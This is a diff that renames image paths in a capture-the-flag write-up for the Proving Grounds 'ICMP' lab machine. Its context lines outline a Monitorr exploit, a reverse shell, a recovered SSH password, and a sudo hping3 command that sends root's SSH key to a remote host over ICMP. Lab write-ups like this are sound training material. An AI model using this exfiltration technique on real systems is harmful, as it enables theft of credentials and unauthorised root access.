@@ -16,11 +16,11 @@ description: "Offsec proving grounds play linux machine writeup"
 ---
 # Walkthrough on Youtube
 
-[![youtube](/assets/images/CTF/Pg-Play/ICMP/youtube.png)](https://youtu.be/6fyL_fFyV4c)
+[![youtube](/assets/images/CTF/Proving_Grounds/ICMP/youtube.png)](https://youtu.be/6fyL_fFyV4c)
 
 ## NMAP
 
-![img](/assets/images/CTF/Pg-Play/ICMP/nmap.png)
+![img](/assets/images/CTF/Proving_Grounds/ICMP/nmap.png)
 
 ## PORT 80 Tech Stack
 
@@ -29,9 +29,9 @@ description: "Offsec proving grounds play linux machine writeup"
 
 ## Monitorr
 
-![img](/assets/images/CTF/Pg-Play/ICMP/monitorr%20version.png)
+![img](/assets/images/CTF/Proving_Grounds/ICMP/monitorr%20version.png)
 
-![img](/assets/images/CTF/Pg-Play/ICMP/searchsploit_search.png)
+![img](/assets/images/CTF/Proving_Grounds/ICMP/searchsploit_search.png)
 
 ### Exploit Code
 
@@ -68,18 +68,18 @@ else:
 ```
 ### Obtaining Reverse Shell
 
-![img](/assets/images/CTF/Pg-Play/ICMP/rce1.png)
+![img](/assets/images/CTF/Proving_Grounds/ICMP/rce1.png)
 
 **Obtained local flag**
 
-![img](/assets/images/CTF/Pg-Play/ICMP/local_flag.png)
+![img](/assets/images/CTF/Proving_Grounds/ICMP/local_flag.png)
 
 # Privilege Escalation
 ### Obtain user
 
 The permission is denied to access the `devel` folder as current user is not a system user. But as the tip found in the reminder file below.
 
-![img](/assets/images/CTF/Pg-Play/ICMP/reminder.png)
+![img](/assets/images/CTF/Proving_Grounds/ICMP/reminder.png)
 
 The php file `crypt.php` inside the `devel` folder disclosed the SSH password for the user `fox`.
 
@@ -90,13 +90,13 @@ echo crypt('BUHNIJMONIBUVCYTTYVGBUHJNI','da');
 ```
 **User access obtained.**
 
-![img](/assets/images/CTF/Pg-Play/ICMP/user.png)
+![img](/assets/images/CTF/Proving_Grounds/ICMP/user.png)
 
 ## Root Privilege Escalation
 
 Check the current user sudo permissions.
 
-![img](/assets/images/CTF/Pg-Play/ICMP/sudo-l.png)
+![img](/assets/images/CTF/Proving_Grounds/ICMP/sudo-l.png)
 
 Search for exploit in GTFO bins for `hping3`
 
@@ -123,25 +123,25 @@ sudo hping3 "$RHOST" --icmp --data 500 --sign xxx --file "$LFILE"
 
 ### ICMP Listener
 
-![img](/assets/images/CTF/Pg-Play/ICMP/icmp-listener.png)
+![img](/assets/images/CTF/Proving_Grounds/ICMP/icmp-listener.png)
 
 ### ICMP: Data send
 
-![img](/assets/images/CTF/Pg-Play/ICMP/icmp_key_send.png)
+![img](/assets/images/CTF/Proving_Grounds/ICMP/icmp_key_send.png)
 
 ### ICMP: Data Receive
 
-![img](/assets/images/CTF/Pg-Play/ICMP/icmp_root_ssh_key.png)
+![img](/assets/images/CTF/Proving_Grounds/ICMP/icmp_root_ssh_key.png)
 
 ## SSH Root User
 
 SSH to the root user using the obtained root SSH key.
 
-![img](/assets/images/CTF/Pg-Play/ICMP/root.png)
+![img](/assets/images/CTF/Proving_Grounds/ICMP/root.png)
 
 **Root user access and proof.txt obtained**
 
-![img](/assets/images/CTF/Pg-Play/ICMP/proof.png)
+![img](/assets/images/CTF/Proving_Grounds/ICMP/proof.png)
 
 Thanks for reading!
 
